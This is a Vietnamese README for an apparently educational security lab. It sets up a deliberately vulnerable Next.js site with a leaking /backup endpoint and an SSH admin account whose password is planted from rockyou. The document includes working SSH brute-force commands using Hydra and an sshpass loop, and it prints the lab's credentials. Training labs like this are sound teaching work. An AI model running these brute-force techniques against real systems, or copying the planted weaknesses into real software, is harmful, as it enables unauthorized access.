# Cài đặt Security Lab - React2Shell Web Vulnerable

Một bộ script hoàn chỉnh để dựng môi trường kiểm thử an ninh mạng với:
- **Web Server**: Apache proxy tới Next.js trên cổng 80
- **Lỗ hổng lộ dữ liệu**: endpoint `/backup` để lộ thông tin tài khoản
- **Dịch vụ SSH**: Tài khoản admin cố ý dùng mật khẩu yếu (có trong rockyou)
- **Kiểm thử Bruteforce**: Script mô phỏng tấn công SSH

## 📋 Yêu cầu

- Hệ thống Linux (khuyến nghị Ubuntu/Debian)
- Quyền root hoặc sudo
- Git (để clone repository)

## 🚀 Cài đặt nhanh (Một lệnh)

```bash
sudo bash scripts/setup-full-lab.sh
```

Lệnh này sẽ tự động:
1. ✅ Cài đặt và cấu hình Apache2 (proxy + /backup + UTF-8)
2. ✅ Cài đặt OpenSSH Server
3. ✅ Tạo tài khoản admin `dpradmin` với mật khẩu bị lộ trong rockyou
4. ✅ Bật xác thực SSH bằng mật khẩu để phục vụ bruteforce

> Ứng dụng Next.js được khởi động riêng (`npm run dev` hoặc service systemd `nextjs-lab`) — xem phần cài đặt database trong `DATABASE_SETUP.md`.

## 📝 Cài đặt thủ công (Từng bước)

Nếu muốn chạy thủ công:

### Bước 1: Cài đặt Web Server
```bash
sudo bash scripts/setup-webserver.sh
```

### Bước 2: Cài đặt SSH
```bash
sudo bash scripts/setup-ssh.sh
```

### Bước 3: Trích xuất thông tin đăng nhập
```bash
bash scripts/extract-credentials.sh
```

### Bước 4: Khởi động ứng dụng
Apache chỉ làm reverse proxy; ứng dụng Next.js chạy riêng qua service systemd
(`nextjs-lab`) hoặc thủ công bằng `npm run dev`.
```bash
sudo systemctl status nextjs-lab
```

## 🧪 Kiểm thử và khai thác

### Kiểm tra cài đặt
```bash
bash scripts/test-lab.sh
```

### Giai đoạn 1: Phát hiện lỗ hổng (OSINT/FUZZING)

Truy cập ứng dụng và khám phá `/backup`:
```bash
# Qua trình duyệt hoặc curl
curl http://localhost/backup/

# Xem tài khoản quản trị máy chủ (chứa username SSH bị lộ)
curl http://localhost/backup/system-accounts.txt

# Xem tài khoản người dùng cổng dịch vụ (mồi nhử)
curl http://localhost/backup/portal-users.txt
```

Các file bị lộ nằm trong:
```
public/backup/
├── system-accounts.txt   # Tài khoản quản trị máy chủ (username SSH bị lộ)
├── portal-users.txt      # Tài khoản người dùng cổng dịch vụ (mồi nhử)
├── database-dump.txt     # Trích xuất một phần cơ sở dữ liệu
├── notes.txt             # Ghi chú vận hành
└── README.txt            # Mô tả thư mục backup
```

### Giai đoạn 2: Trích xuất thông tin cho Bruteforce

```bash
# Đã làm tự động, nhưng có thể tạo lại:
bash scripts/extract-credentials.sh

# Xem các username đã phát hiện
cat fuzzing-output/combined-usernames.txt

# Xem wordlist mật khẩu
cat fuzzing-output/bruteforce-wordlist.txt
```

### Giai đoạn 3: Chạy Bruteforce SSH

#### Cách A: Script tự động
```bash
bash scripts/bruteforce-ssh.sh [host] [cổng] [file-usernames] [file-passwords]

# Ví dụ mặc định:
bash scripts/bruteforce-ssh.sh localhost 22
```

#### Cách B: Dùng Hydra
```bash
# Cài đặt nếu cần
sudo apt-get install -y hydra

# Chạy bruteforce
hydra -l dpradmin \
      -P /usr/share/wordlists/rockyou.txt \
      ssh://localhost -t 4 -v
```

#### Cách C: Thủ công với sshpass
```bash
# Test nhanh với thông tin đăng nhập
sshpass -p 'arsenal' ssh -o StrictHostKeyChecking=no dpradmin@localhost

# Vòng lặp thử nhiều mật khẩu
while read pass; do
  echo "[*] Đang thử $pass..."
  sshpass -p "$pass" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no dpradmin@localhost "id" && \
    echo "[+] THÀNH CÔNG: $pass" && break
done < /usr/share/wordlists/rockyou.txt
```

## 🔑 Thông tin đăng nhập Admin SSH

`setup-ssh.sh` tạo **một** tài khoản admin (admin của repository) với mật khẩu
nằm trong wordlist **rockyou.txt** — tức là có thể bị bẻ khóa bằng brute-force.

| Username   | Mật khẩu  | Ghi chú                                        |
|------------|-----------|------------------------------------------------|
| `dpradmin` | `arsenal` | Thuộc nhóm `sudo`; mật khẩu có trong rockyou    |

> **Username** không được cho không: nó bị lộ trong file
> `http://localhost/backup/system-accounts.txt`. **Mật khẩu** phải được
> tìm ra bằng brute-force với rockyou. Các file khác trong `/backup`
> (ví dụ: `portal-users.txt`) chỉ chứa tài khoản của cổng web làm mồi nhử —
> chúng **không** có quyền truy cập SSH.

## 📊 Luồng khai thác mong đợi

```
1. Phát hiện
   └─ Truy cập http://localhost
   └─ Tìm ra endpoint /backup

2. OSINT/Fuzzing
   └─ Trích xuất username từ /backup
   └─ Tìm nhiều file .txt bị lộ

3. Chuẩn bị Bruteforce
   └─ Tổng hợp danh sách username duy nhất
   └─ Chuẩn bị wordlist mật khẩu phổ biến (rockyou)

4. Bruteforce SSH
   └─ Thử thông tin đăng nhập với SSH (cổng 22)
   └─ Chiếm quyền truy cập bằng tài khoản hợp lệ

5. Hậu khai thác
   └─ Thực thi lệnh với tài khoản bị chiếm
   └─ Leo thang đặc quyền (bài tập bổ sung)
```

## 📁 Cấu trúc file được tạo

```
Cong-thong-tin-dien-tu/
├── scripts/
│   ├── setup-webserver.sh          # Cài Apache (proxy Next.js)
│   ├── setup-ssh.sh                # Cài SSH + tạo tài khoản
│   ├── setup-full-lab.sh           # Script tự động hoàn chỉnh
│   ├── extract-credentials.sh      # Trích xuất thông tin bị lộ
│   ├── test-lab.sh                 # Kiểm tra cấu hình
│   ├── bruteforce-ssh.sh           # Mô phỏng bruteforce SSH
│   ├── install-postgres-db-server.sh
│   ├── setup-lab-docker-postgres.sh
│   └── setup-lab-server-postgres.sh
├── docs/
│   ├── SETUP-LAB-README.md         # File này
│   ├── SCRIPTS-SUMMARY.md          # Tóm tắt các script
│   ├── DATABASE_SETUP.md           # Cài đặt cơ sở dữ liệu
│   └── REACT2SHELL_CONTEXT.md      # Bối cảnh kịch bản
├── fuzzing-output/
│   ├── combined-usernames.txt       # Username duy nhất đã trích xuất
│   ├── bruteforce-wordlist.txt      # Wordlist mật khẩu
│   ├── ssh-bruteforce-guide.txt     # Hướng dẫn công cụ
│   └── ssh-bruteforce-results.txt   # Kết quả các lần test
└── README.md
```

## 🛠️ Xử lý sự cố

### Apache không phản hồi
```bash
# Kiểm tra trạng thái
sudo systemctl status apache2

# Log
sudo tail -f /var/log/apache2/error.log

# Khởi động lại
sudo systemctl restart apache2
```

### Next.js không chạy
```bash
# Kiểm tra service systemd
sudo systemctl status nextjs-lab
sudo journalctl -u nextjs-lab -f

# Khởi động lại thủ công
sudo systemctl restart nextjs-lab
```

### SSH không hoạt động
```bash
# Kiểm tra trạng thái
sudo systemctl status ssh

# Kiểm tra tài khoản đã tạo
cat /etc/passwd | grep dpradmin

# Khởi động lại SSH
sudo systemctl restart ssh

# Test kết nối
ssh -v dpradmin@localhost
```

### Bruteforce không tìm ra thông tin đăng nhập
- Kiểm tra SSH đang chạy: `sudo systemctl status ssh`
- Kiểm tra tài khoản đã được tạo: `id dpradmin`
- Thử thủ công: `sshpass -p 'arsenal' ssh dpradmin@localhost`

## 📚 Tài liệu liên quan

- **public/backup/**: Các file bị lộ (lỗ hổng mô phỏng)
- **AGENTS.md**: Hướng dẫn cho AI agent
- **package.json**: Dependencies của Next.js

## ⚖️ Tuyên bố pháp lý

Lab này **chỉ dùng cho mục đích giáo dục và được phép**.

Dùng trong:
- ✅ Phòng lab cục bộ của chính bạn
- ✅ Môi trường kiểm thử có kiểm soát
- ✅ Đào tạo an ninh mạng được cho phép
- ✅ Cuộc thi CTF
- ✅ Nghiên cứu an ninh mạng có sự cho phép

Không dùng để:
- ❌ Tấn công hệ thống chưa được cho phép
- ❌ Kiểm thử xâm nhập khi chưa có phép
- ❌ Hoạt động phi pháp

## 📧 Hỗ trợ

Khi gặp sự cố, kiểm tra log:
```bash
cat setup-lab.log
```

## 🎯 Các bước học tập tiếp theo

Sau khi hoàn thành khai thác:
1. **Leo thang đặc quyền**: Thử chiếm quyền root
2. **Phân tích mã nguồn**: Tìm hiểu vì sao /backup bị lộ
3. **Vá lỗ hổng**: Triển khai bảo vệ cho /backup
4. **Hardening**: Cải thiện cấu hình SSH (SSH key, tắt đăng nhập root, v.v.)

---
**Cập nhật lần cuối**: 2026-07-04
